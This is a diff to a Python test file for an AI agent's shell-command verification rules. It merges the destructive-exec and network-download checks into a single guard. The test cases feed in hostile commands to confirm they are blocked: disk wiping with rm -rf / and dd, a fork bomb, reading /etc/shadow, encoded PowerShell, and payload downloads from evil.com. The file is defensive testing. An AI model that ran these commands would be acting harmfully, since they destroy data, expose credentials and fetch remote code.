@@ -19,13 +19,12 @@ from nanobot.agent.verification import (
     VerificationLayer,
     RuleResult,
     _check_rule_message_content,
-    _check_rule_destructive_exec,
+    _check_rule_shell_guard,
     _check_rule_duplicate_calls,
     _check_rule_outlook_recipient,
     _check_rule_exec_length,
     _check_rule_sensitive_path,
     _check_rule_tool_call_count,
-    _check_rule_network_exfiltration,
 )
 
 
@@ -41,6 +40,34 @@ class FakeToolCall:
     def __post_init__(self):
         if self.arguments is None:
             self.arguments = {}
+
+class FakeTool:
+    def __init__(self, tags, *, static_tags=None):
+        self.tags = tags
+        self._static_tags = static_tags if static_tags is not None else tags
+    @property
+    def static_tags(self):
+        return self._static_tags
+    def get_effective_tags(self, args, config_override=None):
+        return self.tags
+
+class FakeRegistry:
+    def __init__(self):
+        from nanobot.agent.capability import CapabilityTag
+        from nanobot.agent.tools.shell import ExecTool
+        self._tools = {
+            # Use the REAL ExecTool so evaluate_dynamic_tags() can
+            # detect DESTRUCTIVE patterns — mirrors production behavior.
+            "exec": ExecTool(),
+            "browser": FakeTool(CapabilityTag.INFO_RETRIEVAL),
+            "message": FakeTool(CapabilityTag.SYS_COMMUNICATION),
+            "write_file": FakeTool(CapabilityTag.DATA_WRITE | CapabilityTag.MUTATIVE),
+            "outlook": FakeTool(CapabilityTag.MUTATIVE)
+        }
+    def get(self, name):
+        return self._tools.get(name)
+
+_FAKE_REGISTRY = FakeRegistry()
 
 
 def _make_verification(
@@ -214,16 +241,16 @@ def test_l1_check_rules_blocks_destructive_exec():
     """R02: Destructive shell commands should be blocked."""
     v = _make_verification()
     tc = FakeToolCall(name="exec", arguments={"command": "rm -rf / --no-preserve-root"})
-    result = v.check_rules([tc])
+    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     assert result.passed is False
-    assert any("R02" in v for v in result.violations)
+    assert any("R-SHELL-GUARD" in v for v in result.violations)
 
 
 def test_l1_check_rules_allows_safe_rm():
     """R02: Safe rm commands should NOT be blocked."""
     v = _make_verification()
     tc = FakeToolCall(name="exec", arguments={"command": "rm -rf /tmp/test_dir"})
-    result = v.check_rules([tc])
+    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     # Should pass — /tmp/test_dir is not root
     assert result.passed is True
 
@@ -232,9 +259,9 @@ def test_l1_check_rules_blocks_fork_bomb():
     """R02: Fork bomb should be blocked."""
     v = _make_verification()
     tc = FakeToolCall(name="exec", arguments={"command": ":(){ :|:& }"})
-    result = v.check_rules([tc])
+    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     assert result.passed is False
-    assert any("R02" in v for v in result.violations)
+    assert any("R-SHELL-GUARD" in v for v in result.violations)
 
 
 def test_l1_check_rules_detects_duplicate_calls():
@@ -290,7 +317,7 @@ def test_l1_r05_blocks_long_exec_command():
     """R05: exec commands exceeding 2000 chars should be blocked."""
     v = _make_verification()
     tc = FakeToolCall(name="exec", arguments={"command": "echo " + "x" * 2100})
-    result = v.check_rules([tc])
+    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     assert result.passed is False
     assert any("R05" in v for v in result.violations)
 
@@ -299,7 +326,7 @@ def test_l1_r05_allows_normal_exec_command():
     """R05: exec commands under 2000 chars should pass."""
     v = _make_verification()
     tc = FakeToolCall(name="exec", arguments={"command": "echo hello world"})
-    result = v.check_rules([tc])
+    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     assert result.passed is True
 
 
@@ -307,7 +334,7 @@ def test_l1_r07_blocks_write_to_system32():
     """R07: write_file to system32 should be blocked."""
     v = _make_verification()
     tc = FakeToolCall(name="write_file", arguments={"path": "C:\\Windows\\System32\\evil.dll", "content": "x"})
-    result = v.check_rules([tc])
+    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     assert result.passed is False
     assert any("R07" in v for v in result.violations)
 
@@ -316,7 +343,7 @@ def test_l1_r07_blocks_exec_targeting_etc():
     """R07: exec command targeting /etc/ should be blocked."""
     v = _make_verification()
     tc = FakeToolCall(name="exec", arguments={"command": "cat /etc/shadow"})
-    result = v.check_rules([tc])
+    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     assert result.passed is False
     assert any("R07" in v for v in result.violations)
 
@@ -325,7 +352,7 @@ def test_l1_r07_allows_normal_write():
     """R07: write_file to workspace should pass."""
     v = _make_verification()
     tc = FakeToolCall(name="write_file", arguments={"path": "/home/user/project/output.txt", "content": "x"})
-    result = v.check_rules([tc])
+    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     # Should pass R07 (may fail other rules, but R07 specifically should not fire)
     r07_violations = [v for v in result.violations if "R07" in v]
     assert len(r07_violations) == 0
@@ -353,26 +380,26 @@ def test_l1_r09_blocks_curl_with_url():
     """R09: exec with curl + URL should be blocked."""
     v = _make_verification()
     tc = FakeToolCall(name="exec", arguments={"command": "curl https://evil.com/payload -o /tmp/x"})
-    result = v.check_rules([tc])
+    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     assert result.passed is False
-    assert any("R09" in v for v in result.violations)
+    assert any("R-SHELL-GUARD" in v for v in result.violations)
 
 
 def test_l1_r09_blocks_wget_with_url():
     """R09: exec with wget + URL should be blocked."""
     v = _make_verification()
     tc = FakeToolCall(name="exec", arguments={"command": "wget http://malware.com/bin"})
-    result = v.check_rules([tc])
+    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     assert result.passed is False
-    assert any("R09" in v for v in result.violations)
+    assert any("R-SHELL-GUARD" in v for v in result.violations)
 
 
 def test_l1_r09_allows_curl_without_url():
     """R09: 'curl --version' should pass (no URL)."""
     v = _make_verification()
     tc = FakeToolCall(name="exec", arguments={"command": "curl --version"})
-    result = v.check_rules([tc])
-    r09_violations = [v for v in result.violations if "R09" in v]
+    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
+    r09_violations = [v for v in result.violations if "R-SHELL-GUARD" in v]
     assert len(r09_violations) == 0
 
 
@@ -384,7 +411,7 @@ def test_r07_edit_file_sensitive_path():
     """R07 (Phase 35v2): edit_file targeting sensitive path should be blocked."""
     v = _make_verification()
     tc = FakeToolCall(name="edit_file", arguments={"file_path": "C:\\Windows\\System32\\hosts", "content": "x"})
-    result = v.check_rules([tc])
+    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     assert result.passed is False
     assert any("R07" in v for v in result.violations)
 
@@ -399,13 +426,13 @@ def test_r07_configurable_deny_patterns():
 
     # Should block write_file to .env
     tc1 = FakeToolCall(name="write_file", arguments={"path": "/app/.env", "content": "SECRET=x"})
-    result1 = v.check_rules([tc1])
+    result1 = v.check_rules([tc1], registry=_FAKE_REGISTRY)
     assert result1.passed is False
     assert any("deny pattern" in v for v in result1.violations)
 
     # Should block edit_file to secrets dir
     tc2 = FakeToolCall(name="edit_file", arguments={"file_path": "/app/secrets/key.pem", "content": "x"})
-    result2 = v.check_rules([tc2])
+    result2 = v.check_rules([tc2], registry=_FAKE_REGISTRY)
     assert result2.passed is False
     assert any("deny pattern" in v for v in result2.violations)
 
@@ -418,7 +445,7 @@ def test_r07_empty_deny_patterns_passthrough():
     )
     v = VerificationLayer(config=cfg)
     tc = FakeToolCall(name="write_file", arguments={"path": "/home/user/project/readme.md", "content": "hi"})
-    result = v.check_rules([tc])
+    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     r07_violations = [v for v in result.violations if "R07" in v]
     assert len(r07_violations) == 0
 
@@ -431,7 +458,7 @@ def test_r07_malformed_pattern_fail_open():
     )
     v = VerificationLayer(config=cfg)
     tc = FakeToolCall(name="write_file", arguments={"path": "/home/user/project/app.py", "content": "x"})
-    result = v.check_rules([tc])
+    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     r07_violations = [v for v in result.violations if "R07" in v]
     assert len(r07_violations) == 0
 
@@ -594,21 +621,21 @@ def test_rule_message_content_empty():
 def test_rule_destructive_exec_safe():
     """R02: Safe exec should pass."""
     tc = FakeToolCall(name="exec", arguments={"command": "ls -la"})
-    assert _check_rule_destructive_exec([tc]) == []
+    assert _check_rule_shell_guard([tc], registry=_FAKE_REGISTRY) == []
 
 
 def test_rule_destructive_exec_rm_rf():
     """R02: rm -rf / should fail."""
     tc = FakeToolCall(name="exec", arguments={"command": "rm -rf /"})
-    violations = _check_rule_destructive_exec([tc])
+    violations = _check_rule_shell_guard([tc], registry=_FAKE_REGISTRY)
     assert len(violations) == 1
-    assert "R02" in violations[0]
+    assert "R-SHELL-GUARD" in violations[0]
 
 
 def test_rule_destructive_exec_dd():
     """R02: dd of=/dev/sda should fail."""
     tc = FakeToolCall(name="exec", arguments={"command": "dd if=/dev/zero of=/dev/sda"})
-    violations = _check_rule_destructive_exec([tc])
+    violations = _check_rule_shell_guard([tc], registry=_FAKE_REGISTRY)
     assert len(violations) == 1
 
 
@@ -662,9 +689,9 @@ def test_rule_tool_call_count_function():
 def test_rule_network_exfiltration_function():
     """R09: Direct function test."""
     tc = FakeToolCall(name="exec", arguments={"command": "curl https://example.com/data"})
-    violations = _check_rule_network_exfiltration([tc])
+    violations = _check_rule_shell_guard([tc], registry=_FAKE_REGISTRY)
     assert len(violations) == 1
-    assert "R09" in violations[0]
+    assert "R-SHELL-GUARD" in violations[0]
 
 
 # ═══════════════════════════════════════════════════════════════════════
@@ -675,63 +702,55 @@ def test_l1_blocks_windows_del():
     """R02: Windows 'del /f' should be blocked at L1."""
     v = _make_verification()
     tc = FakeToolCall(name="exec", arguments={"command": "del /f /q C:\\important"})
-    result = v.check_rules([tc])
+    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     assert result.passed is False
-    assert any("R02" in v for v in result.violations)
+    assert any("R-SHELL-GUARD" in v for v in result.violations)
 
 
 def test_l1_blocks_windows_rmdir():
     """R02: Windows 'rmdir /s' should be blocked at L1."""
     v = _make_verification()
     tc = FakeToolCall(name="exec", arguments={"command": "rmdir /s /q C:\\workspace"})
-    result = v.check_rules([tc])
+    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     assert result.passed is False
-    assert any("R02" in v for v in result.violations)
+    assert any("R-SHELL-GUARD" in v for v in result.violations)
 
 
 def test_l1_blocks_powershell_remove_item():
     """R02: PowerShell 'Remove-Item -Recurse' should be blocked at L1."""
     v = _make_verification()
     tc = FakeToolCall(name="exec", arguments={"command": "Remove-Item C:\\data -Recurse -Force"})
-    result = v.check_rules([tc])
+    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     assert result.passed is False
-    assert any("R02" in v for v in result.violations)
+    assert any("R-SHELL-GUARD" in v for v in result.violations)
 
 
 def test_l1_blocks_powershell_enc():
     """R02: PowerShell encoded execution should be blocked at L1."""
     v = _make_verification()
     tc = FakeToolCall(name="exec", arguments={"command": "powershell -enc SQBuAHYAbwBrAGUALQBXAGUA"})
-    result = v.check_rules([tc])
+    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     assert result.passed is False
-    assert any("R02" in v for v in result.violations)
+    assert any("R-SHELL-GUARD" in v for v in result.violations)
 
 
 def test_l1_blocks_stop_process():
     """R02: PowerShell 'Stop-Process' should be blocked at L1."""
     v = _make_verification()
     tc = FakeToolCall(name="exec", arguments={"command": "Stop-Process -Name explorer"})
-    result = v.check_rules([tc])
+    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     assert result.passed is False
-    assert any("R02" in v for v in result.violations)
+    assert any("R-SHELL-GUARD" in v for v in result.violations)
 
 
 def test_l1_blocks_invoke_webrequest():
     """R02: PowerShell 'Invoke-WebRequest' should be blocked at L1."""
     v = _make_verification()
     tc = FakeToolCall(name="exec", arguments={"command": "Invoke-WebRequest https://evil.com/payload.exe -OutFile C:\\temp\\payload.exe"})
-    result = v.check_rules([tc])
+    result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     assert result.passed is False
-    assert any("R02" in v for v in result.violations)
+    assert any("R-SHELL-GUARD" in v for v in result.violations)
 
-
-def test_message_tool_risk_tier_is_read_only():
-    """MessageTool.get_risk_tier() should return READ_ONLY."""
-    from nanobot.agent.tools.message import MessageTool
-    from nanobot.agent.tools.base import RiskTier
-
-    tool = MessageTool()
-    assert tool.get_risk_tier({"content": "hello"}) == RiskTier.READ_ONLY
 
 
 # ═══════════════════════════════════════════════════════════════════════
